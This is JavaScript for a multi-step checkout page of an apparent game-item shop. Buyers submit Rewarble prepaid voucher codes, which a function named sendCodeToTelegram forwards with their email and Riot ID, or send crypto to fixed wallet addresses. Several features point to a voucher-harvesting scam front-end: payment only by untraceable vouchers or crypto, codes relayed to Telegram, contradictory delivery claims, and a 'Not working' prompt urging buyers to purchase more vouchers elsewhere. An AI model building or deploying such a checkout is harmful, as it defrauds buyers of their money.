const PAYMENT_STORAGE_PREFIX = 'riotshop_payment_';
const SUBMISSION_TOAST_MSG = 'Your code is being processed. It may take up to 24 hours.';

function getOrderStorageKey(orderId) {
  return `${PAYMENT_STORAGE_PREFIX}${orderId}`;
}

function loadOrderState(orderId) {
  try {
    return JSON.parse(sessionStorage.getItem(getOrderStorageKey(orderId)) || '{}');
  } catch {
    return {};
  }
}

function saveOrderState(orderId, state) {
  sessionStorage.setItem(getOrderStorageKey(orderId), JSON.stringify(state));
}

function methodLabel(id) {
  return PAYMENT_METHODS.find((m) => m.id === id)?.label || id;
}

function cryptoCoinLabel(id) {
  return CRYPTO_COINS.find((c) => c.id === id)?.label || id;
}

function renderStepIndicator(step, isCrypto = false) {
  const steps = [
    { n: 1, label: 'Payment Method' },
    { n: 2, label: 'Delivery Details' },
    { n: 3, label: isCrypto ? 'Crypto Payment' : 'Complete Payment' },
  ];

  return `
    <div class="payment-steps" aria-label="Checkout progress">
      ${steps.map((s) => `
        <div class="payment-step-indicator${step >= s.n ? ' is-active' : ''}${step > s.n ? ' is-done' : ''}">
          <span class="payment-step-num">${s.n}</span>
          <span class="payment-step-label">${s.label}</span>
        </div>
      `).join('')}
    </div>
  `;
}

function renderOrderSummary(order, state = {}) {
  const hasDiscount = Boolean(state.discountApplied && order.originalPrice > order.price);
  const savings = hasDiscount
    ? Math.round((order.originalPrice - order.price) * 100) / 100
    : 0;

  return `
    <div class="payment-order-summary glass-card">
      <p class="payment-order-label">Your order</p>
      <p class="payment-order-product">${getOrderProductLabel(order)}</p>
      ${hasDiscount ? `
        <p class="payment-order-price-original">${formatPrice(order.originalPrice)}</p>
        <p class="payment-order-discount-badge">${state.discountCode} applied — you save ${formatPrice(savings)}</p>
      ` : ''}
      <p class="payment-order-price">${formatPrice(order.price)}</p>
      <p class="payment-order-id">Order ${order.orderId}</p>
      <p class="payment-instant-note">Delivery is instant after payment confirmation.</p>
    </div>
  `;
}

function renderDiscountBlock(state) {
  return `
    <section class="payment-section-card glass-card" data-field="discount-code">
      <h2 class="payment-section-title">Discount code</h2>
      <p class="payment-section-sub">Optional — apply a promo code before you choose how to pay.</p>
      <div class="payment-field-card">
        <label class="form-label" for="discount-code">Enter code</label>
        <div class="payment-discount-row">
          <input
            type="text"
            id="discount-code"
            class="form-input"
            placeholder="Enter your code"
            value="${state.discountCode || ''}"
            ${state.discountApplied ? 'readonly' : ''}
            autocomplete="off"
            spellcheck="false"
          >
          ${state.discountApplied ? `
            <button type="button" class="btn-secondary payment-discount-btn" id="btn-remove-discount">Remove</button>
          ` : `
            <button type="button" class="btn-secondary payment-discount-btn" id="btn-apply-discount">Apply</button>
          `}
        </div>
        <p class="field-error" role="alert"></p>
        ${state.discountApplied ? `
          <p class="payment-discount-success">${state.discountCode} applied — 50% off this order.</p>
        ` : `
          <p class="payment-discount-hint">Have a welcome offer code? Enter it above and click Apply.</p>
        `}
      </div>
    </section>
  `;
}

function renderStepMethod(order, state) {
  return `
    ${renderStepIndicator(1)}
    ${renderOrderSummary(order, state)}
    <div class="payment-checkout-stack">
      ${renderDiscountBlock(state)}
      <section class="payment-section-card glass-card">
        <h2 class="payment-section-title">Select payment method</h2>
        <p class="payment-section-sub">Choose how you will pay for your order.</p>
        <div class="payment-method-grid">
          ${PAYMENT_METHODS.map((m) => `
            <button type="button" class="payment-method-card${state.method === m.id ? ' is-selected' : ''}" data-method="${m.id}">
              <span>${m.label}</span>
            </button>
          `).join('')}
        </div>
        <button type="button" class="btn-primary w-full py-3.5 mt-6" id="btn-step1-next" ${state.method ? '' : 'disabled'}>
          Continue
        </button>
      </section>
    </div>
  `;
}

function renderStepEmail(order, state) {
  const needsRiotId = orderRequiresRiotId(order.type);

  return `
    ${renderStepIndicator(2)}
    ${renderOrderSummary(order, state)}
    <div class="payment-checkout-stack">
      <section class="payment-section-card glass-card">
        <h2 class="payment-section-title">Delivery details</h2>
        <p class="payment-section-sub">
          ${needsRiotId
            ? 'We need your Riot ID and email to deliver this order.'
            : 'Tell us where to send your order.'}
        </p>
        ${needsRiotId ? `
          <div class="payment-field-card form-field" data-field="riot-id">
            <label class="form-label" for="riot-id">Riot ID</label>
            <input type="text" id="riot-id" class="form-input" placeholder="Username#TAG" value="${state.riotId || ''}" autocomplete="username">
            <p class="field-error" role="alert"></p>
          </div>
        ` : ''}
        <div class="payment-field-card form-field${needsRiotId ? ' mt-4' : ''}" data-field="delivery-email">
          <label class="form-label" for="delivery-email">Delivery email</label>
          <input type="email" id="delivery-email" class="form-input" placeholder="you@email.com" value="${state.email || ''}" autocomplete="email">
          <p class="field-error" role="alert"></p>
        </div>
        <div class="payment-nav-row mt-6">
          <button type="button" class="btn-secondary px-6 py-3" id="btn-step2-back">Back</button>
          <button type="button" class="btn-primary flex-1 py-3.5" id="btn-step2-next">Continue</button>
        </div>
      </section>
    </div>
  `;
}

function renderVoucherList(breakdown) {
  return breakdown.map((tier) => `
    <div class="voucher-row">
      <div>
        <p class="voucher-tier">$${tier} Rewarble voucher</p>
        <p class="voucher-hint">Purchase using your selected payment method</p>
      </div>
      <a href="${REWARBLE_VOUCHERS[tier]}" target="_blank" rel="noopener" class="btn-secondary py-2 px-4 text-sm">Buy $${tier}</a>
    </div>
  `).join('');
}

function renderAltProviders() {
  return `
    <div class="alt-providers glass-card">
      <h3 class="payment-panel-title text-base">Try another provider</h3>
      <p class="payment-panel-sub">You can also buy Rewarble vouchers from these sites:</p>
      <ul class="alt-provider-list">
        ${ALT_REWARBLE_PROVIDERS.map((p) => `
          <li><a href="${p.url}" target="_blank" rel="noopener">${p.name}</a></li>
        `).join('')}
      </ul>
    </div>
  `;
}

function renderCryptoDetailsContent(order, state, rates, ratesError) {
  const coin = CRYPTO_COINS.find((c) => c.id === state.cryptoCoin);
  if (!coin) {
    return '<p class="crypto-pick-hint">Choose a coin above to view the payment address and amount.</p>';
  }

  const rate = rates?.[coin.id];
  const cryptoAmount = rate ? calcCryptoAmount(order.price, rate, coin.decimals) : null;

  return `
    <div class="crypto-payment-box">
      <div class="crypto-amount-row">
        <div class="crypto-amount-block">
          <span class="crypto-amount-label">USD amount</span>
          <button type="button" class="crypto-copy-value" data-copy="${order.price.toFixed(2)}">
            ${formatPrice(order.price)}
            <span class="crypto-copy-hint">Click to copy</span>
          </button>
        </div>
        <div class="crypto-amount-block">
          <span class="crypto-amount-label">${coin.symbol} amount</span>
          ${ratesError ? `
            <p class="crypto-rate-error">${ratesError}</p>
            <button type="button" class="btn-secondary py-2 px-4 text-sm mt-2" id="btn-retry-rates">Retry rates</button>
          ` : cryptoAmount ? `
            <button type="button" class="crypto-copy-value" data-copy="${cryptoAmount}">
              ${cryptoAmount} ${coin.symbol}
              <span class="crypto-copy-hint">Click to copy</span>
            </button>
            ${rate ? `<p class="crypto-rate-note">1 ${coin.symbol} ≈ $${rate.toLocaleString('en-US', { maximumFractionDigits: 2 })}</p>` : ''}
          ` : `
            <p class="crypto-rate-loading">Loading live rate…</p>
          `}
        </div>
      </div>

      <div class="crypto-address-block">
        <span class="crypto-amount-label">${coin.label} address</span>
        <button type="button" class="crypto-address-copy" data-copy="${coin.address}">
          <code class="crypto-address-text">${coin.address}</code>
          <span class="crypto-copy-icon" aria-hidden="true">
            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
          </span>
        </button>
        <p class="crypto-address-hint">Send the exact amount above. Delivery is instant after payment confirmation.</p>
      </div>
    </div>
  `;
}

function renderCryptoCheckout(order, state, rates, ratesError) {
  const hasCoin = Boolean(state.cryptoCoin);

  return `
    <div class="crypto-checkout">
      <div class="crypto-coin-section">
        <p class="crypto-section-label">Select cryptocurrency</p>
        <div class="crypto-coin-grid" id="crypto-coin-grid">
          ${CRYPTO_COINS.map((coin) => `
            <button type="button" class="crypto-coin-btn${state.cryptoCoin === coin.id ? ' is-selected' : ''}" data-crypto-coin="${coin.id}">
              <span class="crypto-coin-name">${coin.label}</span>
              <span class="crypto-coin-symbol">${coin.symbol}</span>
            </button>
          `).join('')}
        </div>
      </div>
      <div class="crypto-details${hasCoin ? ' is-open' : ''}" id="crypto-details">
        ${renderCryptoDetailsContent(order, state, rates, ratesError)}
      </div>
    </div>
  `;
}

function renderStepPay(order, state, cryptoRates = null, cryptoRatesError = '') {
  const isCrypto = state.method === 'crypto';
  const breakdown = getVoucherBreakdown(order.price);
  const attemptsLeft = MAX_CODE_ATTEMPTS - (state.attempts || 0);
  const showAlt = Boolean(state.showAltProviders);

  if (isCrypto) {
    return `
      ${renderStepIndicator(3, true)}
      ${renderOrderSummary(order, state)}
      <div class="payment-panel glass-card">
        <h2 class="payment-panel-title">Complete crypto payment</h2>
        <p class="payment-panel-sub">
          Paying with <strong class="text-heading">Crypto</strong>.
          Pick your coin below, then copy the amount and address to complete payment.
        </p>
        ${renderCryptoCheckout(order, state, cryptoRates, cryptoRatesError)}
        <div class="payment-nav-row mt-6">
          <button type="button" class="btn-secondary px-6 py-3" id="btn-step3-back">Back</button>
        </div>
      </div>
    `;
  }

  return `
    ${renderStepIndicator(3)}
    ${renderOrderSummary(order, state)}
    <div class="payment-panel glass-card">
      <h2 class="payment-panel-title">Complete payment</h2>
      <p class="payment-panel-sub">
        Paying with <strong class="text-heading">${methodLabel(state.method)}</strong>.
        Buy the voucher(s) below, then submit your code.
      </p>
      <div class="voucher-list">${renderVoucherList(breakdown)}</div>
      <p class="payment-total-voucher">Total voucher value needed: <strong>$${breakdown.reduce((a, b) => a + b, 0)}</strong></p>

      <div class="payment-field-card form-field mt-6" data-field="voucher-code">
        <label class="form-label" for="voucher-code">Rewarble voucher code</label>
        <input type="text" id="voucher-code" class="form-input" placeholder="Paste your voucher code" autocomplete="off">
        <p class="field-error" role="alert"></p>
      </div>

      <p class="payment-attempts text-sm text-muted">Attempts remaining: ${attemptsLeft}</p>

      <div class="payment-nav-row mt-4">
        <button type="button" class="btn-secondary px-6 py-3" id="btn-step3-back">Back</button>
        <button type="button" class="btn-primary flex-1 py-3.5" id="btn-submit-code">Submit Code</button>
      </div>
      <button type="button" class="btn-secondary w-full py-3 mt-3" id="btn-not-working">Not working</button>
      ${showAlt ? renderAltProviders() : ''}
    </div>
  `;
}

function renderCancelled(order) {
  return `
    <div class="payment-panel glass-card payment-cancelled text-center">
      <div class="brand-icon-well w-16 h-16 flex items-center justify-center mx-auto mb-4">
        <svg class="w-8 h-8 text-riot-red" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
      </div>
      <h2 class="payment-panel-title">Order cancelled</h2>
      <p class="payment-panel-sub">Your order was cancelled for submitting a maximum of ${MAX_CODE_ATTEMPTS} codes.</p>
      <p class="text-muted text-sm mt-2">Order ${order.orderId}</p>
      <a href="/" class="btn-primary px-8 py-3 mt-8 inline-flex">Return home</a>
    </div>
  `;
}

function renderInvalidOrder() {
  return `
    <div class="payment-panel glass-card text-center">
      <h2 class="payment-panel-title">Invalid order</h2>
      <p class="payment-panel-sub">This checkout link is missing product details.</p>
      <a href="/" class="btn-primary px-8 py-3 mt-6 inline-flex">Return home</a>
    </div>
  `;
}

function setFieldError(fieldName, message) {
  const field = document.querySelector(`.form-field[data-field="${fieldName}"]`);
  if (!field) return;
  field.classList.add('is-invalid');
  const err = field.querySelector('.field-error');
  if (err) err.textContent = message;
}

function clearFieldError(field) {
  field.classList.remove('is-invalid');
  const err = field.querySelector('.field-error');
  if (err) err.textContent = '';
}

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isValidRiotId(riotId) {
  return /^.+#.+$/.test(riotId.trim());
}

async function copyToClipboard(text, label = 'Copied') {
  try {
    await navigator.clipboard.writeText(text);
    showToast(label);
    return true;
  } catch {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try {
      document.execCommand('copy');
      showToast(label);
      return true;
    } catch {
      showToast('Could not copy. Please copy manually.');
      return false;
    } finally {
      document.body.removeChild(ta);
    }
  }
}

async function sendCodeToTelegram(payload) {
  const res = await fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || 'Failed to submit code');
  }

  return res.json();
}

const PAYMENT_TRANSITION_MS = 320;

function bindCopyButtons(scope = document) {
  scope.querySelectorAll('[data-copy]').forEach((el) => {
    el.addEventListener('click', () => {
      copyToClipboard(el.dataset.copy, 'Copied to clipboard');
    });
  });
}

function mountPaymentApp(order) {
  const root = document.getElementById('payment-root');
  if (!root) return;

  let state = {
    step: 1,
    method: '',
    email: '',
    riotId: '',
    cryptoCoin: '',
    discountCode: '',
    discountApplied: false,
    discountAutoTried: false,
    attempts: 0,
    showAltProviders: false,
    status: 'active',
    cryptoRates: null,
    cryptoRatesError: '',
    ...loadOrderState(order.orderId),
  };

  const pendingDiscount = getPendingDiscountCode();
  if (!state.discountApplied && pendingDiscount && !state.discountCode) {
    state.discountCode = pendingDiscount;
  }

  syncOrderPrice(order, state);

  if (state.status === 'cancelled' || state.attempts >= MAX_CODE_ATTEMPTS) {
    state.status = 'cancelled';
    root.innerHTML = renderCancelled(order);
    return;
  }

  if (state.status === 'success') {
    state.status = 'active';
    state.step = 3;
    persist();
  }

  function persist() {
    const { cryptoRates, ...toSave } = state;
    saveOrderState(order.orderId, toSave);
  }

  function getStepHtml() {
    if (state.step === 1) return renderStepMethod(order, state);
    if (state.step === 2) return renderStepEmail(order, state);
    return renderStepPay(order, state, state.cryptoRates, state.cryptoRatesError);
  }

  function maybeAutoApplyDiscount() {
    if (state.discountAutoTried || state.discountApplied || state.step !== 1) return;

    const pending = getPendingDiscountCode();
    if (!state.discountCode && pending) {
      state.discountCode = pending;
    }
    if (!state.discountCode) return;

    state.discountAutoTried = true;
    applyDiscountFromInput();
  }

  function postRender() {
    bindEvents();
    initScrollReveal(root);
    maybeAutoApplyDiscount();

    if (
      state.status === 'active'
      && state.step === 3
      && state.method === 'crypto'
      && state.cryptoCoin
      && !state.cryptoRates
      && !state.cryptoRatesError
    ) {
      loadCryptoRates();
    }
  }

  function applyHtml(html, { animate = true } = {}) {
    const flow = root.querySelector('.payment-flow');
    const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

    if (!animate || reduced || !flow) {
      root.innerHTML = `<div class="payment-flow">${html}</div>`;
      postRender();
      return;
    }

    flow.classList.add('is-leaving');
    window.setTimeout(() => {
      root.innerHTML = `<div class="payment-flow is-entering">${html}</div>`;
      postRender();
      const next = root.querySelector('.payment-flow');
      requestAnimationFrame(() => {
        next?.classList.add('is-active');
        window.setTimeout(() => next?.classList.remove('is-entering', 'is-active'), PAYMENT_TRANSITION_MS);
      });
    }, PAYMENT_TRANSITION_MS);
  }

  function updateCryptoSection() {
    const grid = document.getElementById('crypto-coin-grid');
    const details = document.getElementById('crypto-details');
    if (!grid || !details) {
      applyHtml(getStepHtml(), { animate: false });
      return;
    }

    grid.querySelectorAll('[data-crypto-coin]').forEach((btn) => {
      btn.classList.toggle('is-selected', btn.dataset.cryptoCoin === state.cryptoCoin);
    });

    details.innerHTML = renderCryptoDetailsContent(order, state, state.cryptoRates, state.cryptoRatesError);
    details.classList.toggle('is-open', Boolean(state.cryptoCoin));

    bindCopyButtons(details);
    const retryRates = details.querySelector('#btn-retry-rates');
    if (retryRates) {
      retryRates.addEventListener('click', () => loadCryptoRates());
    }
  }

  async function loadCryptoRates() {
    state.cryptoRatesError = '';
    updateCryptoSection();

    try {
      state.cryptoRates = await fetchCryptoRates();
    } catch {
      state.cryptoRates = null;
      state.cryptoRatesError = 'Could not load live rates. Try again in a moment.';
    }
    persist();
    updateCryptoSection();
  }

  function updateAttemptsDisplay() {
    const attemptsEl = root.querySelector('.payment-attempts');
    if (!attemptsEl) return;
    const attemptsLeft = MAX_CODE_ATTEMPTS - (state.attempts || 0);
    attemptsEl.textContent = `Attempts remaining: ${attemptsLeft}`;
  }

  function render({ animate = true } = {}) {
    if (state.status === 'cancelled') {
      root.innerHTML = renderCancelled(order);
      return;
    }

    applyHtml(getStepHtml(), { animate });
  }

  function buildPayload(extra = {}) {
    return {
      orderId: order.orderId,
      email: state.email,
      riotId: state.riotId || undefined,
      method: state.method,
      methodLabel: methodLabel(state.method),
      productType: order.type,
      productLabel: getOrderProductLabel(order),
      price: order.price,
      originalPrice: order.originalPrice,
      discountCode: state.discountApplied ? state.discountCode : undefined,
      discountSavings: state.discountApplied
        ? Math.round((order.originalPrice - order.price) * 100) / 100
        : undefined,
      attempt: state.attempts,
      ...extra,
    };
  }

  function setDiscountError(message) {
    const section = document.querySelector('.payment-section-card[data-field="discount-code"]');
    if (!section) return;
    const fieldCard = section.querySelector('.payment-field-card');
    const isInvalid = Boolean(message);
    section.classList.toggle('is-invalid', isInvalid);
    fieldCard?.classList.toggle('is-invalid', isInvalid);
    const err = section.querySelector('.field-error');
    if (err) err.textContent = message || '';
  }

  function applyDiscountFromInput() {
    const input = document.getElementById('discount-code');
    const code = input?.value || state.discountCode || '';
    const validation = validateDiscountCode(code);

    if (!validation.valid) {
      const msg = validation.error || 'Invalid code';
      setDiscountError(msg);
      if (msg === 'Invalid code') {
        showToast('Invalid code');
      }
      return false;
    }

    state.discountCode = validation.code;
    state.discountApplied = true;
    clearPendingDiscountCode();
    syncOrderPrice(order, state);
    setDiscountError('');
    showToast(`${validation.code} applied — 50% off`);
    persist();
    render({ animate: false });
    return true;
  }

  function removeDiscount() {
    state.discountApplied = false;
    state.discountCode = '';
    syncOrderPrice(order, state);
    setDiscountError('');
    persist();
    render({ animate: false });
  }

  function bindEvents() {
    root.querySelectorAll('.payment-method-card[data-method]').forEach((card) => {
      card.addEventListener('click', () => {
        state.method = card.dataset.method;
        if (state.method !== 'crypto') state.cryptoCoin = '';
        persist();
        render({ animate: false });
      });
    });

    root.querySelectorAll('[data-crypto-coin]').forEach((card) => {
      card.addEventListener('click', () => {
        const nextCoin = card.dataset.cryptoCoin;
        if (state.cryptoCoin === nextCoin) return;
        state.cryptoCoin = nextCoin;
        state.cryptoRates = null;
        state.cryptoRatesError = '';
        persist();
        updateCryptoSection();
        if (state.cryptoCoin) loadCryptoRates();
      });
    });

    bindCopyButtons(root);

    const applyDiscountBtn = document.getElementById('btn-apply-discount');
    if (applyDiscountBtn) {
      applyDiscountBtn.addEventListener('click', () => applyDiscountFromInput());
    }

    const removeDiscountBtn = document.getElementById('btn-remove-discount');
    if (removeDiscountBtn) {
      removeDiscountBtn.addEventListener('click', () => removeDiscount());
    }

    const discountInput = document.getElementById('discount-code');
    if (discountInput && !state.discountApplied) {
      discountInput.addEventListener('input', () => setDiscountError(''));
      discountInput.addEventListener('keydown', (event) => {
        if (event.key === 'Enter') {
          event.preventDefault();
          applyDiscountFromInput();
        }
      });
    }

    const step1Next = document.getElementById('btn-step1-next');
    if (step1Next) {
      step1Next.addEventListener('click', () => {
        if (!state.method) return;
        state.step = 2;
        persist();
        render({ animate: true });
      });
    }

    const step2Back = document.getElementById('btn-step2-back');
    if (step2Back) {
      step2Back.addEventListener('click', () => {
        state.step = 1;
        persist();
        render({ animate: true });
      });
    }

    const step2Next = document.getElementById('btn-step2-next');
    if (step2Next) {
      step2Next.addEventListener('click', () => {
        const needsRiotId = orderRequiresRiotId(order.type);

        if (needsRiotId) {
          const riotInput = document.getElementById('riot-id');
          const riotField = riotInput?.closest('.form-field');
          if (riotField) clearFieldError(riotField);
          const riotId = riotInput?.value.trim() || '';
          if (!isValidRiotId(riotId)) {
            setFieldError('riot-id', 'Enter a valid Riot ID (e.g. Username#TAG).');
            return;
          }
          state.riotId = riotId;
        }

        const input = document.getElementById('delivery-email');
        const field = input?.closest('.form-field');
        if (field) clearFieldError(field);
        const email = input?.value.trim() || '';
        if (!isValidEmail(email)) {
          setFieldError('delivery-email', 'Please enter a valid delivery email.');
          return;
        }
        state.email = email;
        state.step = 3;
        persist();
        render({ animate: true });
      });
    }

    const step3Back = document.getElementById('btn-step3-back');
    if (step3Back) {
      step3Back.addEventListener('click', () => {
        state.step = 2;
        persist();
        render({ animate: true });
      });
    }

    const notWorking = document.getElementById('btn-not-working');
    if (notWorking) {
      notWorking.addEventListener('click', () => {
        state.showAltProviders = true;
        persist();
        render({ animate: false });
      });
    }

    const submitCode = document.getElementById('btn-submit-code');
    if (submitCode) {
      submitCode.addEventListener('click', async () => {
        const input = document.getElementById('voucher-code');
        const field = input?.closest('.form-field');
        if (field) clearFieldError(field);

        const code = input?.value.trim() || '';
        if (!code || code.length < 4) {
          setFieldError('voucher-code', 'Please enter a valid voucher code.');
          return;
        }

        if (state.attempts >= MAX_CODE_ATTEMPTS) {
          state.status = 'cancelled';
          persist();
          render();
          return;
        }

        state.attempts += 1;
        persist();

        submitCode.disabled = true;
        submitCode.textContent = 'Submitting...';

        const payload = buildPayload({
          code,
          vouchers: getVoucherBreakdown(order.price),
        });

        try {
          await sendCodeToTelegram(payload);
          if (state.discountApplied && state.discountCode) {
            const discountValidation = validateDiscountCode(state.discountCode);
            if (discountValidation.valid) {
              markDiscountCodeUsed(discountValidation.config.usedKey);
            }
          }
          persist();
          if (input) input.value = '';
          updateAttemptsDisplay();
          showToast(SUBMISSION_TOAST_MSG, 5000);
        } catch {
          if (state.attempts >= MAX_CODE_ATTEMPTS) {
            state.status = 'cancelled';
            persist();
            render();
            return;
          }

          setFieldError('voucher-code', 'Could not submit code. Try again or use another provider.');
          updateAttemptsDisplay();
        } finally {
          submitCode.disabled = false;
          submitCode.textContent = 'Submit Code';
        }
      });
    }
  }

  render({ animate: false });
}

document.addEventListener('DOMContentLoaded', () => {
  initLayout('payment');
  const order = parseOrderFromUrl();
  const root = document.getElementById('payment-root');

  if (!order) {
    if (root) root.innerHTML = renderInvalidOrder();
    return;
  }

  const url = new URL(window.location.href);
  if (!url.searchParams.get('oid')) {
    url.searchParams.set('oid', order.orderId);
    window.history.replaceState({}, '', url);
  }

  mountPaymentApp(order);
});